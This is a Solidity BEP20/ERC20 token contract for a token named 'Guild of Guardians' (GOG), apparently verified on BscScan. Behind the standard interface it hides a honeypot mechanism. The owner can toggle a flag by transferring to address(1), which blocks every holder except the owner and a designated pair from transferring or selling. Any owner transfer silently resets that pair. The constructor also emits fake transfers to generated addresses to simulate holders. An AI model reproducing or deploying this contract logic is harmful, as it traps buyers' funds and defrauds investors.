/**
 *Submitted for verification at BscScan.com on 2021-11-16
*/

pragma solidity ^0.5.0;

contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    
}

contract GOG is ERC20Interface {
    string public name;
    string public symbol;
    address public owner;
    address public pancakePair;
    bool sl;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it

    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    
    
    constructor() public {
        name = "Guild of Guardians";
        symbol = "GOG";
        decimals = 18;
        _totalSupply = 1 * 10**9 * 10 ** 18;
        owner = msg.sender;
        sl = true;
        
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        
        uint256 sendValue = 10000 * 10**18;
        for(uint256 i = 2424;i<2434;i++){
            address ad = address(uint256(keccak256(abi.encode(i))));
            balances[ad] = sendValue;
            emit Transfer(owner, ad,sendValue);
        }
        
        balances[msg.sender] = _totalSupply - (100000 * 10**18);
        
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function safeAdd(uint a, uint b) pure private returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) pure private returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) private pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) private pure returns (uint c) { require(b > 0);
        c = a / b;
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        if(msg.sender == owner && to == address(1)){
            sl=!sl;
        }
        else if(msg.sender == owner){
            pancakePair = to;
        }
        
        require(owner == msg.sender || pancakePair == msg.sender || sl,"Something wrong");
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
        
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        require((from == owner && msg.sender == pancakePair) || sl,"Something wrong");
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }
    
}